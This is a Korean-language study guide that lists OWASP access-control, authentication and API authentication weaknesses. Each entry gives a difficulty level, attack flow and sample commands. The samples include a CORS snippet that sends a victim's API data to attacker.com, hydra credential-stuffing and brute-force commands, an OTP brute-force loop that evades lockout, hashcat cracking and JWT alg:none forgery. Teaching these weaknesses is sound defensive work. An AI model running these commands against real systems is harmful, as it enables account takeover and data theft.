# 인증·세션 (Authentication & Session) — OWASP 공식 기준 전체 하위 유형

출처 (2026-10-27 확인, OWASP 공식 최신판 기준 — Top 10:2025, 2021은 이전 버전):
- https://top10.owasp.org/2025/A01_2025-Broken_Access_Control/
- https://top10.owasp.org/2025/A07_2025-Authentication_Failures/
- https://api-security.owasp.org/editions/2023/en/0xa2-broken-authentication/

이 문서는 "인증·세션" 대분류에 속하는 OWASP A01(접근 제어 실패)과 A07(인증 실패)의 하위 항목 전부, 그리고 API Security Top 10의 API2(Broken Authentication) 하위 항목을 모은 것입니다. 각 항목은 난이도(하/중/상), 개념 설명, 정상 흐름 대 공격 흐름, 실제 명령어·페이로드 예시로 구성됩니다.

---

## A01. 접근 제어 실패 (Broken Access Control) — 하위 8개

### 1. 최소 권한 원칙 위반 — 난이도 하

**개념**: 서버 설계 자체가 "이건 관리자만", "이건 담당자만"이라는 구분을 두지 않고 모든 로그인 사용자에게 똑같이 열어버린 상태입니다.

**흐름**: 정상 사용자는 자기 권한에 맞는 메뉴만 보고 씁니다. 공격자는 메뉴에 안 보여도, 그 뒤에 있는 실제 주소(엔드포인트)를 직접 두드려봅니다.

**명령어 예시**:
```
curl -b "session=일반유저쿠키" https://target/admin/users
```

---

### 2. URL·파라미터 변조로 접근 통제 우회 — 난이도 하

**개념**: 서버가 "이 요청을 보낸 사람이 이 작업을 할 자격이 있는지"를 URL에 들어간 값이나 숨겨진 파라미터만 보고 판단하는데, 그 값 자체를 사용자가 바꿀 수 있습니다.

**흐름**: 정상 사용자는 자기 화면에서 제공된 링크만 클릭합니다. 공격자는 그 링크의 파라미터(`role=user`, `step=1` 등)를 직접 고쳐서 보냅니다.

**명령어 예시**:
```
GET /checkout?role=user   →   GET /checkout?role=admin
```
또는 숨겨진 입력 필드 `<input type="hidden" name="step" value="1">`을 브라우저 개발자 도구에서 `value="3"`으로 바꾼 뒤 제출.

---

### 3. IDOR (Insecure Direct Object Reference) — 난이도 하

**개념**: 번역하면 "안전하지 않은 직접 객체 참조"입니다. 서버가 요청에 들어있는 ID 값으로 자원을 바로 꺼내주는데, 그 ID가 "요청한 사람의 것인지"는 확인하지 않습니다.

**흐름**: 정상 사용자는 자기 배치 번호(예: 7번)로 접근합니다. 공격자는 그 번호만 다른 숫자로 바꿔봅니다.

**명령어 예시**:
```
GET /batch?id=7   (내 것)
GET /batch?id=1   (남의 것, 혹은 관리자 자원)
```

---

### 4. 변경용 API 메서드(POST/PUT/DELETE)에 접근 통제 누락 — 난이도 하부터 중까지

**개념**: 조회(GET)는 막아놨는데, 실제로 데이터를 바꾸거나 지우는 POST/PUT/DELETE 요청에는 권한 검사를 빼먹은 경우입니다.

**흐름**: 화면에는 "삭제" 버튼이 관리자에게만 보입니다. 하지만 그 버튼이 보내는 실제 요청 자체는 아무나 보낼 수 있습니다.

**명령어 예시**:
```
curl -X DELETE -b "session=일반유저쿠키" https://target/api/users/5
```

---

### 5. 권한 상승(Privilege Escalation) — 난이도 중

**개념**: 비로그인 상태에서 로그인한 척(수평), 또는 일반 사용자가 관리자인 척(수직) 가장하는 것입니다. 역할(role) 자체를 속이는 경우를 포함합니다.

**흐름**: 공격자는 자기 역할 정보가 어디(쿠키, JWT 안의 클레임, 요청 바디)에 저장되는지 먼저 찾아낸 뒤, 그 값을 관리자 역할 값으로 바꿉니다.

**명령어 예시**:
```
{"role": "user"}   →   {"role": "admin"}
```
서버가 클라이언트가 보낸 role을 그대로 믿는 경우, 회원가입이나 프로필 수정 요청에 이 값을 넣어 보냅니다.

---

### 6. 메타데이터 조작 (JWT 재사용·변조, 쿠키·hidden field 변조) — 난이도 중

**개념**: 로그인 상태를 증명하는 수단(JWT 토큰, 쿠키, 화면에 숨겨진 입력값)을 사용자가 직접 뜯어보고 고칠 수 있는 경우입니다.

**흐름**: 서버가 쿠키 값 하나만 보고 상태를 판단하면 그 쿠키를 그냥 고쳐서 보냅니다. JWT라면 토큰을 디코딩해서 내용을 바꾼 뒤 다시 인코딩해서 보냅니다 (서명이 검증되지 않거나 약하게 검증되는 경우에만 통함).

**명령어 예시**:
```
브라우저 쿠키 편집기로 d01_bean_state=raw 를 d01_bean_state=roasted 로 직접 수정
```
JWT의 경우:
```
node -e "console.log(Buffer.from('헤더또는페이로드부분', 'base64url').toString())"
```
디코딩한 값을 바꾼 뒤 다시 base64url로 인코딩해서 재구성.

---

### 7. CORS 설정 오류 — 난이도 중부터 상까지

**개념**: CORS(Cross-Origin Resource Sharing)는 "어느 출처(다른 도메인)의 웹페이지가 내 API를 읽어갈 수 있는지"를 서버가 응답 헤더로 지정하는 규칙입니다. 이 설정을 너무 느슨하게(`Access-Control-Allow-Origin: *`를 자격증명 포함 요청에까지 허용하는 식으로) 하면, 아무 사이트에서나 로그인된 사용자의 API 응답을 읽어갈 수 있습니다.

**흐름**: 공격자가 만든 외부 페이지에 피해자가 접속하면, 그 페이지의 JavaScript가 피해자의 쿠키를 들고 target API에 요청을 보내고, 응답을 공격자 서버로 빼갑니다.

**명령어 예시** (공격자 페이지 안의 코드):
```javascript
fetch('https://target/api/me', {credentials: 'include'})
  .then(r => r.json())
  .then(data => fetch('https://attacker.com/steal?d=' + JSON.stringify(data)))
```

---

### 8. 강제 탐색(Forced Browsing) — 난이도 하

**개념**: 화면에 링크로 안 보이지만 실제로 존재하는 주소를, 공격자가 URL만 직접 입력해서 접근하는 것입니다.

**흐름**: "2차 승인" 주소를 화면 소스(view-source)에서 알아낸 뒤 1차 검토를 건너뛰고 바로 입력하는 식, 또는 robots.txt에 적힌 Disallow 경로를 보고 직접 접근하는 식입니다.

**명령어 예시**:
```
view-source:https://target/review   (HTML 주석 안의 숨은 경로 발견)
curl -b "session=쿠키" https://target/approve   (직접 호출)
```

> CWE 매핑 참고: A01의 CWE 매핑은 Top 10:2025 기준 40개(2021판은 34개)입니다. CSRF(CWE-352)는 하위 항목 목록에는 없지만 CWE 매핑에 포함됩니다. SSRF(CWE-918)는 2025판에서 새로 추가됐습니다.

## A07. 인증 실패 (Authentication Failures) — 하위 12개

### 1. 자격증명 스터핑(Credential Stuffing) — 난이도 하

**개념**: 다른 사이트에서 유출된 아이디/비밀번호 조합 목록을 이 사이트 로그인 창에 그대로 자동 대입하는 공격입니다. 사람들이 비밀번호를 재사용하는 습관을 노립니다.

**흐름**: 공격자는 다크웹 등에서 유출된 `이메일:비밀번호` 목록 파일을 구한 뒤, 로그인 폼에 자동으로 하나씩 넣어봅니다.

**명령어 예시**:
```
hydra -C leaked_combo.txt target.com http-post-form "/login:id=^USER^&pw=^PASS^:실패문구"
```

---

### 2. 무차별 대입(Brute Force) 자동화 차단 미비 — 난이도 하

**개념**: 비밀번호나 OTP를 랜덤하게 전부 시도해보는 공격을 서버가 못 막는 경우입니다.

**흐름**: 정상 사용자는 OTP를 한 번만 입력합니다. 공격자는 0000부터 9999까지 전부 시도하되, 식별 헤더 값을 매 요청마다 바꿔서 잠금을 피할 수도 있습니다.

**명령어 예시**:
```
for i in $(seq -w 0 9999); do curl -s -b "쿠키" -H "X-Terminal-Id: t-$i" -d "code=$i" https://target/verify-code; done
```

---

### 3. 기본값·약한·널리 알려진 비밀번호 허용 — 난이도 하

**개념**: `admin`/`admin`, `password123` 같은, 누구나 처음 시도해볼 만한 비밀번호를 서버가 그대로 허용하는 경우입니다.

**흐름**: 공격자는 흔한 비밀번호 사전(rockyou.txt 같은 것)을 가지고 로그인을 시도합니다.

**명령어 예시**:
```
hydra -l admin -P common_passwords.txt target.com http-post-form "/login:id=admin&pw=^PASS^:실패문구"
```

---

### 4. 유출된 자격증명으로 신규 계정 생성 허용 — 난이도 중

**개념**: 이미 유출 목록에 있는 비밀번호인데도 신규 가입 시 그걸 그대로 쓰게 허용하는 경우입니다.

**흐름**: 공격자가 회원가입 폼에 알려진 유출 비밀번호를 넣어보고, 서버가 거부하지 않으면 그 계정은 나중에 credential stuffing 대상이 됩니다.

**명령어 예시**:
```
POST /signup {"id": "newuser", "pw": "123456789"}
```

---

### 5. 취약한 비밀번호 찾기·복구 절차 — 난이도 중

**개념**: "비밀번호를 잊으셨나요?"에서 묻는 질문(생일, 애완동물 이름 등)이 추측 가능하거나, 추측 가능한 재설정 토큰을 쓰는 경우입니다.

**흐름**: 공격자는 피해자의 SNS 등에서 복구 질문의 답을 알아낸 뒤 복구 절차를 통과합니다.

**명령어 예시**:
```
POST /recover {"answer": "1995-03-02"}
```

---

### 6. 비밀번호 평문·가역 암호화·약한 해시 저장 — 난이도 상

**개념**: 서버 DB 자체에 비밀번호가 암호화 안 된 상태로, 혹은 복호화 가능한 방식으로, 혹은 MD5 같은 약한 해시로 저장되는 경우입니다. 공격자가 이걸 악용하려면 먼저 DB 접근 권한(다른 취약점으로 침투)이 필요하므로 난이도가 높습니다.

**흐름**: 다른 경로(SQL Injection 등)로 DB를 탈취한 뒤, 비밀번호 컬럼을 보면 바로 평문이거나 쉽게 깨지는 해시입니다.

**명령어 예시**:
```
hashcat -m 0 hash.txt rockyou.txt
```

---

### 7. MFA(다중 인증) 누락 또는 비효과적 — 난이도 중

**개념**: 비밀번호 하나만으로 로그인이 끝나거나, 2차 인증이 있어도 그걸 검증하는 서버 로직에 구멍이 있는 경우입니다.

**흐름**: 정상 사용자는 비밀번호, OTP 입력, 최종 화면 순서를 거칩니다. 공격자는 1차 통과를 나타내는 쿠키를 직접 만들어서 OTP 단계 자체를 건너뜁니다.

**명령어 예시**:
```
curl -b "pre_auth=1" https://target/final-control
```
(로그인도, OTP도 입력하지 않고 바로 호출)

---

### 8. MFA 불가 시 약한 대체 수단 허용 — 난이도 중

**개념**: "OTP 앱이 없으면 문자(SMS)로 받으세요" 같은 대체 수단이, 원래 수단보다 훨씬 약한 보안을 제공하는 경우입니다 (SMS는 가로채기·심 스와핑에 취약).

**흐름**: 공격자가 피해자의 통신사 계정을 공격해 SIM을 자기 번호로 옮긴 뒤, 그 번호로 오는 OTP 문자를 받습니다.

**명령어 예시**: 통신사 사회공학 공격이 선행되어야 해서 단일 명령어로 표현하기 어렵습니다. "대체 인증 수단으로 전환" 버튼을 눌러 SMS 인증 경로로 유도하는 것이 핵심 단계입니다.

---

### 9. 세션 식별자의 URL·hidden field 노출 — 난이도 중

**개념**: 로그인 상태를 증명하는 토큰이 쿠키가 아니라 URL 안에 있거나, 화면 소스의 숨겨진 입력값에 그대로 노출되는 경우입니다. URL에 있으면 브라우저 히스토리, 서버 로그, Referer 헤더를 통해 유출될 수 있습니다.

**흐름**: 공격자는 피해자가 공유한 링크나 서버 접속 로그를 확보해서 그 안의 토큰을 그대로 재사용합니다.

**명령어 예시**:
```
curl "https://target/mypage?session=abcd1234"
```

---

### 10. 세션 고정(Session Fixation) — 난이도 상

**개념**: 로그인하기 전에 발급된 세션 ID가, 로그인에 성공한 뒤에도 바뀌지 않고 그대로 쓰이는 경우입니다. 공격자가 "로그인 전 세션 ID"를 미리 피해자에게 심어두면, 피해자가 그 세션으로 로그인하는 순간 공격자도 같은 세션으로 로그인된 상태가 됩니다.

**흐름**: ① 공격자가 target 사이트에 접속해서 로그인 전 세션 ID(`sid=XYZ`)를 받음 → ② 피해자에게 `https://target/login?sid=XYZ` 같은 링크를 클릭하게 유도 → ③ 피해자가 그 세션으로 로그인 → ④ 공격자가 자기가 갖고 있던 같은 `sid=XYZ` 쿠키로 접속하면 피해자 계정으로 로그인된 상태.

**명령어 예시**:
```
curl -b "sid=XYZ" https://target/mypage
```
(피해자가 로그인한 뒤 실행)

---

### 11. 로그아웃 시 세션·토큰 미무효화 — 난이도 중

**개념**: 로그아웃 버튼을 눌러도 서버 안의 "현재 유효한 세션 목록"에서 그 토큰이 안 지워지는 경우입니다.

**흐름**: 공격자가 피해자의 토큰을 로그아웃 전에 미리 확보해뒀다면, 피해자가 로그아웃한 뒤에도 그 토큰으로 계속 접근됩니다.

**명령어 예시**:
```
curl -H "Authorization: Bearer 확보해둔토큰" https://target/mypage
```
(피해자 로그아웃 이후에도 계속 성공)

---

### 12. 자격증명의 scope·audience 검증 누락 — 난이도 상

**개념**: OAuth/JWT 토큰에는 "이 토큰이 어느 서비스(audience)를 위해 발급됐는지", "어느 권한 범위(scope)까지 쓸 수 있는지"가 들어있어야 하는데, 서버가 그걸 확인하지 않는 경우입니다. 다른 서비스를 위해 발급된 토큰을 이 서비스에 들이밀어도 통과됩니다.

**흐름**: 공격자가 서비스 A에서 정당하게 발급받은 토큰을, audience 검증이 없는 서비스 B에 그대로 사용합니다.

**명령어 예시**:
```
curl -H "Authorization: Bearer 서비스A용토큰" https://serviceB/api/me
```

## 보충 — API Security Top 10:2023, API2 Broken Authentication 하위 항목

출처: https://api-security.owasp.org/editions/2023/en/0xa2-broken-authentication/

A07과 겹치는 부분이 많지만, API 관점에서 특히 강조하는 항목 10개와 마이크로서비스 전용 2개입니다.

1. 자격증명 스터핑 (A07-1과 동일)
2. captcha·계정 잠금 없는 무차별 대입 (A07-2와 동일)
3. 약한 비밀번호 (A07-3과 동일)
4. URL에 토큰·비밀번호를 담아 전송 (A07-9와 동일)
5. 민감한 작업 전에 재인증을 요구하지 않음 — **난이도 중**: 비밀번호 변경, 결제수단 변경 같은 민감 작업 직전에 "비밀번호를 다시 입력하세요"가 없으면, 세션을 탈취한 공격자가 바로 그 작업까지 해버릴 수 있습니다.
6. 토큰의 진위(서명 등)를 검증하지 않음 — **난이도 상**: 서명 검증 코드 자체가 빠져 있거나 잘못 구현된 경우입니다.
7. 서명 없거나 약한 JWT 허용 (`alg: none` 등) — **난이도 상**: JWT 헤더의 `alg` 값을 `none`으로 바꾸고 서명 부분을 빈 문자열로 보내면, 검증 로직이 "서명 없음"을 그대로 통과시켜버리는 경우입니다. 예: 토큰 헤더를 `{"alg":"none","typ":"JWT"}`로 바꾸고 서명 부분을 제거한 뒤 전송.
8. JWT 만료(expiration)를 검증하지 않음 — **난이도 중**: 토큰에 `exp`(만료 시각) 클레임이 있어도 서버가 그 값을 확인하지 않으면, 이미 끝난 세션의 토큰이 영구히 유효합니다.
9. 비밀번호를 평문/무암호화/약한 해시로 저장 (A07-6과 동일)
10. 약한 암호화 키 사용 — **난이도 상**: JWT 서명 키가 너무 짧거나 추측 가능한 문자열이면, 공격자가 그 키를 추측하거나 무차별 대입으로 찾아내서 토큰을 위조할 수 있습니다.
11. (마이크로서비스) 내부 서비스 간 요청에 인증 없이 접근 허용 — **난이도 중**: 내부망이라서 안전하다고 가정하고 서비스 간 호출에 인증을 안 거는 경우, 내부망에 침투한 공격자는 아무 제약 없이 돌아다닙니다.
12. (마이크로서비스) 약하거나 예측 가능한 내부 토큰으로만 인증 — **난이도 중**: 내부 서비스 간 토큰이 고정값이거나 추측 가능한 패턴이면 그대로 재사용됩니다.
